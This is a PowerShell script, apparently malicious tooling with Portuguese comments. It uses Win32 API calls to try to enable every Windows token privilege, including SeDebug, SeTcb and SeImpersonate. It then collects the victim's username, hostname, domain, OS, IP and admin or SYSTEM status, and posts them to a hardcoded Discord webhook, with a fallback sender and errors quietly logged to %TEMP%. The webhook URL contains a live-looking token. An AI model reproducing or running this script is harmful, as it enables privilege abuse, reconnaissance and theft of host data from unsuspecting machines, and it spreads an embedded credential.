# enable_all_privs.ps1 
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try { Add-Type -AssemblyName System.Web -ErrorAction Stop } catch { }

$privs = @("SeAssignPrimaryTokenPrivilege","SeAuditPrivilege","SeBackupPrivilege","SeChangeNotifyPrivilege","SeCreateGlobalPrivilege","SeCreatePagefilePrivilege","SeCreatePermanentPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeIncreaseBasePriorityPrivilege","SeIncreaseQuotaPrivilege","SeLoadDriverPrivilege","SeLockMemoryPrivilege","SeManageVolumePrivilege","SeProfileSingleProcessPrivilege","SeRemoteShutdownPrivilege","SeRestorePrivilege","SeSecurityPrivilege","SeShutdownPrivilege","SeSyncAgentPrivilege","SeSystemEnvironmentPrivilege","SeSystemProfilePrivilege","SeSystemtimePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","SeUndockPrivilege")

# P/Invoke simples com fallback
$source = @"
using System; using System.Runtime.InteropServices; public class Win32 { [DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, int a, out IntPtr t); [DllImport("advapi32.dll",SetLastError=true)] public static extern bool LookupPrivilegeValue(string n, string p, out long l); [DllImport("advapi32.dll",SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref long s, int b, IntPtr p, IntPtr r); }
"@
try { Add-Type $source -ErrorAction Stop } catch { Write-Output "Add-Type falhou: $($_.Exception.Message)" | Out-File "$env:TEMP\privs_error.txt" -Append }

$token = [IntPtr]::Zero
try {
    $handle = (Get-Process -Id $PID).Handle
    if ([Win32]::OpenProcessToken($handle, 0x0028, [ref]$token)) {
        foreach ($priv in $privs) {
            try {
                $luid = 0
                if ([Win32]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
                    $newState = $luid -bor 0x00000002L
                    [Win32]::AdjustTokenPrivileges($token, $false, [ref]$newState, 16, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
                }
            } catch { }
        }
    }
} catch { "Token adjust falhou: $($_.Exception.Message)" | Out-File "$env:TEMP\privs_error.txt" -Append }

$info = @{
    username = $env:USERNAME
    computername = $env:COMPUTERNAME
    domain = $env:USERDOMAIN
    os = try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Unknown" }
    arch = $env:PROCESSOR_ARCHITECTURE
    local_ip = try { (Test-Connection $env:COMPUTERNAME -Count 1 | Select -First 1 -Expand IPv4Address).IPAddressToString } catch { "Unknown" }
    is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")
    is_system = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
    time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

$json = $info | ConvertTo-Json -Compress
$webhook = "https://discord.com/api/webhooks/1381109681250111498/BXc8AHFVlV6atxurL_gE5p01cf09brPzQRaJQbqU2Mm6eqO_V6FYQQ0CHUO4Le7bl5pC"
$body = @{ content = "```json`n$json`n```" } | ConvertTo-Json

# Envia com fallback (Invoke-RestMethod ou WebClient)
$sent = $false
try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
    $sent = $true
} catch {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/json")
        $wc.UploadString($webhook, $body)
        $sent = $true
    } catch { }
}

# Se falhou, loga em %TEMP%
if (-not $sent) {
    "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))] Webhook falhou: $($_.Exception.Message)`nJSON: $json" | Out-File "$env:TEMP\webhook_error.txt" -Append -Force
}
